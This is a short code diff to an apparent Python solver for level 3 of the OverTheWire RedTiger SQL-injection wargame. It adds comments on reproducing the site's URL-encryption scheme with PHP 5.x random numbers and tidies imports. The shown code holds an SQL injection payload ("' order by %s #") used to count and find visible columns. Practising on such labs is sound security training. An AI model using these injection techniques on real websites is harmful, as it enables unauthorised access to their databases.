@@ -2,14 +2,19 @@
 import pickle
 import tigers as tg
 import subprocess
-
-import random
 import base64
 from os import system
 import subprocess
 
 
 def encrypt_python(cryptstr: str):
+    '''
+    encryption function for level 3
+    the original code has been rewritten to python 3
+    the sequence of random numbers corresponds to 
+    the output of the function $srd = rand(0, 255); 
+    for srand(3284724) php 5.x;
+    '''
     cryptedstr = ""
     rand_num = [107, 183, 99, 223, 226, 137, 255, 56, 162, 1, 221,
                 252, 41, 207, 127, 101, 223, 97, 157, 106, 13, 235,
@@ -33,6 +38,11 @@ def encrypt_python(cryptstr: str):
 
 
 def encrypt_php(cryptstr: str):
+    '''
+    encryption function for level 3
+    requires php 5.x
+    reproduces the code from view-source:https://redtiger.labs.overthewire.org/urlcrypt.inc
+    '''
     result = subprocess.run(
         ['php', '-f', 'tiger3.php', cryptstr],    # program and arguments
         stdout=subprocess.PIPE,  # capture stdout
@@ -80,7 +90,6 @@ def main():
     # Counting the number of columns
     columns = tg.count_columns(url, "' order by %s #", 'usr', cook, fun)
     list_of_columns = [str(c + 1) for c in range(columns)]
-    print(list_of_columns)
 
     # Search for visible columns
     list_of_visible, html_visible = tg.find_visible_columns(
